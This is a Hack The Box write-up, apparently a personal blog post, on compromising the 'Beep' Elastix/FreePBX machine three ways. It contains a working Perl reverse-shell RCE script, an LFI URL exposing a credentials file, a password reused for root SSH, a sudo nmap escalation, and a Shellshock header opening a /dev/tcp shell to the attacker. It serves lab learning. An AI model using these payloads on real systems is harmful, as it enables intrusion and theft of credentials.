---
title: "Beep"
date: 2023-07-10T23:51:29+02:00
tags: ["privesc","web","linux","ssh"]
categories: ["hackthebox"]
author: "Ayman Boulaich"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Linux machine with a communications server software that brings IP PBX, email, IM, faxing and collaboration functionality into a single platform and a lot of ways to exploit them as well."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: Beep
- Difficulty level: Easy
- Room link: https://app.hackthebox.com/machines/Beep

![Untitled](/HTB/beep-icon.png)

## Tools Used

- Nmap
- Searchsploit
- BurpSuite
- SSH

## Port Scanning

```bash
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68=
|   2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw==
25/tcp    open  smtp       syn-ack ttl 63 Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.10.10.7/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: LOGIN-DELAY(0) UIDL APOP RESP-CODES EXPIRE(NEVER) IMPLEMENTATION(Cyrus POP3 server v2) USER STLS PIPELINING TOP AUTH-RESP-CODE
111/tcp   open  rpcbind    syn-ack ttl 63 2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: CATENATE LITERAL+ SORT=MODSEQ URLAUTHA0001 MAILBOX-REFERRALS CONDSTORE UIDPLUS ATOMIC IDLE LISTEXT MULTIAPPEND IMAP4rev1 CHILDREN X-NETSCAPE Completed ANNOTATEMORE ACL THREAD=REFERENCES STARTTLS THREAD=ORDEREDSUBJECT OK NAMESPACE QUOTA SORT BINARY LIST-SUBSCRIBED IMAP4 RIGHTS=kxte UNSELECT NO ID RENAME
443/tcp   open  ssl/http   syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS))
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry
|_/
|_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F
|_ssl-date: 2023-07-04T11:40:21+00:00; 0s from scanner time.
|_http-server-header: Apache/2.2.3 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit/emailAddress=root@localhost.localdomain
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2017-04-07T08:22:08
| Not valid after:  2018-04-07T08:22:08
| MD5:   621a:82b6:cf7e:1afa:5284:1c91:60c8:fbc8
| SHA-1: 800a:c6e7:065e:1198:0187:c452:0d9b:18ef:e557:a09f
| -----BEGIN CERTIFICATE-----
| MIIEDjCCA3egAwIBAgICfVUwDQYJKoZIhvcNAQEFBQAwgbsxCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIEwlTb21lU3RhdGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQK
| ExBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MR4wHAYDVQQDExVsb2NhbGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0B
| CQEWGnJvb3RAbG9jYWxob3N0LmxvY2FsZG9tYWluMB4XDTE3MDQwNzA4MjIwOFoX
| DTE4MDQwNzA4MjIwOFowgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh
| dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u
| MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh
| bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0
| LmxvY2FsZG9tYWluMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3e4HhLYPN
| gwJ4eKlW/UpmemPfK/a3mcafSqx/AJP34OC0Twj/cZNaqFPLOWfNjcq4mmiV++9a
| oJCkj4apDkyICI1emsrPaRdrlA/cCXcn3nupfOgcfpBV4vqNfqorEqpJCO7T4bcp
| Z6YHuxtRtP7gRJiE1ytAFP2jDvtvMqEWkwIDAQABo4IBHTCCARkwHQYDVR0OBBYE
| FL/OLJ7hJVedlL5Gk0fYvo6bZkqWMIHpBgNVHSMEgeEwgd6AFL/OLJ7hJVedlL5G
| k0fYvo6bZkqWoYHBpIG+MIG7MQswCQYDVQQGEwItLTESMBAGA1UECBMJU29tZVN0
| YXRlMREwDwYDVQQHEwhTb21lQ2l0eTEZMBcGA1UEChMQU29tZU9yZ2FuaXphdGlv
| bjEfMB0GA1UECxMWU29tZU9yZ2FuaXphdGlvbmFsVW5pdDEeMBwGA1UEAxMVbG9j
| YWxob3N0LmxvY2FsZG9tYWluMSkwJwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9z
| dC5sb2NhbGRvbWFpboICfVUwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOB
| gQA+ah2n+bomON94KgibPEVPpmW+8N6Sq3f4qDG54urTnPD39GrYHvMwA3B2ang9
| l3zta5tXYAVj22kiNM2si4bOMQsa6FZR4AEzWCq9tZS/vTCCRaT79mWj3bUvtDkV
| 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw==
|_-----END CERTIFICATE-----
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
878/tcp   open  status     syn-ack ttl 63 1 (RPC #100024)
993/tcp   open  ssl/imap   syn-ack ttl 63 Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d
3306/tcp  open  mysql      syn-ack ttl 63 MySQL (unauthorized)
4190/tcp  open  sieve      syn-ack ttl 63 Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp? syn-ack ttl 63
4559/tcp  open  hylafax    syn-ack ttl 63 HylaFAX 4.3.10
5038/tcp  open  asterisk   syn-ack ttl 63 Asterisk Call Manager 1.1
10000/tcp open  http       syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
```

We have a bunch of ports in this machine let’s see what we are handling:

First we have **the port 22** for ssh service, maybe interesting with a valid credentials

**The ports 80, 443 and 10000** are running web services the first one redirects to the 443 port so we only have two web services. We can observe that the linux machine is a CentOS

**The ports 25, 110, 143** are running mail services and the ports 993, 995 are mail services too but from a open source called Cyrus, his version is shown at **the port 4190** as **Cyrus timsieved 2.3.7.**

**The port 4559** is running a FAX service named **HylaFAX 4.3.10**

**Asterix** is open source Call Manager running at **port 5038**

The only port that I don’t find any info it’s **the port 4445** which runs the **upnotifyp?** service.

## Enumeration

We have a lot of ways to start to enumerate but my favourite is to start with the web services.

![Untitled](/HTB/beep-1.png)

The first one shows a Elastix login page,I tried the common and the default credentials and nothing seems to work. 

Elastix is a unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality which fits well what the previous nmap scan.

Let’s do a quick fuzz to see what we have. I used the -k flag to avoid the ssl check.

```bash
gobuster dir -u https://$IP/ -w ~/Documents/wordlists/KaliLists/dirb/common.txt -f -k -o fuzz | tee fuzz.save
```

```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/aymanboulaichdahhou/Documents/wordlists/KaliLists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/07/10 13:50:09 Starting gobuster in directory enumeration mode
===============================================================
/.hta/                (Status: 403) [Size: 283]
/.htaccess/           (Status: 403) [Size: 288]
/.htpasswd/           (Status: 403) [Size: 288]
/admin/               (Status: 302) [Size: 0] [--> config.php]
/cgi-bin/             (Status: 403) [Size: 286]
/cgi-bin//            (Status: 403) [Size: 287]
/configs/             (Status: 200) [Size: 1282]
/error/               (Status: 403) [Size: 284]
/help/                (Status: 200) [Size: 346]
/icons/               (Status: 200) [Size: 31006]
/images/              (Status: 200) [Size: 29898]
/index.php/           (Status: 200) [Size: 1785]
/lang/                (Status: 200) [Size: 4788]
/libs/                (Status: 200) [Size: 7798]
/mail/                (Status: 200) [Size: 2411]
/mailman/             (Status: 403) [Size: 286]
/modules/             (Status: 200) [Size: 13132]
/panel/               (Status: 200) [Size: 1065]
/pipermail/           (Status: 200) [Size: 698]
/static/              (Status: 200) [Size: 1276]
/themes/              (Status: 200) [Size: 3172]
/var/                 (Status: 200) [Size: 1236]

===============================================================
2023/07/10 13:54:08 Finished
===============================================================
```

The directories leaks the FreePBX version which is 2.8.1.4.

If we search Elastix in searchsploit we have a lot of useful exploits.

![Untitled](/HTB/beep-2.png)

The only that definitely doesn’t gonna work is the XSS exploit because is a client side vulnerability. The two exploits which are so interesting are the **RCE** one and the **LFI** one. The **PHP injection** is a good one but is using the same file as the LFI and I will still consider it in case of the LFI doesn’t work.The **Blind SQL Injection** is on the iridium_threed.php script that the server doesn’t seem to load.

Now let’s see the website located at port 10000.

![Untitled](/HTB/beep-3.png)

We can see again a login webpage, I tried to log in again without success. We can see that the webpage is running webmin. I am going to search some exploits for it.

![Untitled](/HTB/beep-4.png)

A lot of exploits mention cgi so maybe has a *Shellshock vulnerability* exploited previously in [Shocker](http://pwndside.github.io/posts/shocker-htb) machine.

It’s important to mention that the two websites have a ssl security problem with the certificate and I only can access them with Chromium.

## Exploiting

So we have three possible ways to exploit the machine, maybe more but let’s focus on what we have.

### First Way

The first one is the **RCE**, let’s download the python script and see what is inside.

```bash
searchsploit -m "18650"
```

The script is a url encoded reverse shell that is sent to the remote machine

```bash
import urllib
import ssl
rhost="10.10.10.7"
lhost="10.10.14.20"
lport=4444
extension="1000"

ssl._create_default_https_context = ssl._create_unverified_context

# Reverse shell payload

url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

urllib.urlopen(url)
```

If we change the values of rhost and lhost,lport we can run the exploit and what happen. As it a reverse shell we need to perform a netcat listener

```bash
nc -lv 4444
```

![Untitled](/HTB/beep-5.png)

A SSL error occurred at moment of execution, I tried to change the script without success. Let’s try to make a proxy listener with burp to allow to send the malicious request to us and later send it to the machine. That allows us to send the request without ssl and resend it with ssl thanks to the burp listener

First we are changing the rhost value to [localhost](http://localhost) and the url from https to http.

Once we made this change, in BurpSuite with sudo privileges we need to go to **Proxy > Options > Proxy Listeners > Add** and in the Blinding page we put the port 80 and in the Request Handling we need to change the host to 10.10.10.7 and the port to 443 and check the SSL use.

With this done let’s put a the same nc listener and see if that works well.

Nothing seems to happen but looking at **HTTP history**, this time with the Burp Listener we can have more info of the error.

![Untitled](/HTB/beep-6.png)

We can see that the problem is the PBX extension which seems is not a working one.

There is a utility called **SIPVicious** which is a open source VoIP security testing toolset which allow us to identify a working extension line on a PBX with their tool *svwar*.

```bash
sipvicious_svwar -m INVITE -e100-500 $IP
```

-m : allow us to specify the method

-e : allow us to define a extension range

```bash
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+
```

The results shows that the 233 is a valid extension for the attack.

Now let’s run all again with the changes.

![Untitled](/HTB/beep-7.png)

First once we spawn a bash with `python -c 'import pty; pty.spawn("/bin/bash")` then lets keep the nc in background with ctrl^z, once done we use `stty raw -echo` and then `fg` to return to the web shell but fully interactive this time.

We have a shell now but without root privilege

Let’s cat the user flag

![Untitled](/HTB/beep-8.png)

If we use sudo -l we can see that we have a lot of ways to be a root

![Untitled](/HTB/beep-9.png)

I choose nmap one. We can find a payload in [GTFOBins](https://gtfobins.github.io/)

```bash
sudo nmap --interactive
nmap> !sh
```

This one works for me, let’s cat the root’s flag

![Untitled](/HTB/beep-10.png)

### Second Way

Let’s move to the second way to own this machine, the LFI vulnerability.

```bash
searchsploit -m "37637"
```

If we look at the exploit we can see that they use the url “https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action” to exploit the vuln. So let’s see what we can find in this page.

![Untitled](/HTB/beep-11.png)

The page shows a file so we can deduce that there is a LFI vulnerability. There are a bunch of usernames and passwords, one of them caught my attention. 

```bash
ARI_ADMIN_USERNAME=admin # This is the default admin password to allow an administrator to login to ARI bypassing all security.
ARI_ADMIN_PASSWORD=jEhdIekWmdjE # Change this to a secure password.
```

I tried to log with ssh in the machine with admin@10.10.10.7 and the password found but without success. My ssh key algorithms doesn’t match with the machine ones so I perform this command to be able to connect with ssh.

```bash
ssh -o KexAlgorithms=+diffie-hellman-group-exchange-sha1 -o HostKeyAlgorithms=+ssh-dss admin@10.10.10.7
```

Let’s move to /etc/passwd directory to see what user are in the machine

![Untitled](/HTB/beep-12.png)

Let’s try to log in ssh as root with the previous credentials.

![Untitled](/HTB/beep-13.png)

We have gained access.

### Third Way

Finally the last form to gain access, with the shellsock vulnerability.

We are going to exploit the main page.

The basis of this vuln is to edit the http request to modify the User-Agent header to “() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.20/4444 0>&1” we can do that with burp and allows us with a listening port to have a reverse shell. 

![Untitled](/HTB/beep-14.png)

This pictures shows so well how really works.

Let’s set the listener and send the request.

```bash
nc -lv 4444
```

![Untitled](/HTB/beep-15.png)

![Untitled](/HTB/beep-16.png)

## Lessons Learned

- What insights did you gain from the room?
    
    How works a VoIP with PBX and how to exploit them as well as how to exploit a LFI vulnerability. The RCE and LFI can be avoided with a good URL sanitation.
    
- Were there any novel tools or techniques employed?
    
    The use of svwar which helps me to identify possible extensions for PBX.

**Thank you for reading, and happy hacking! 😄**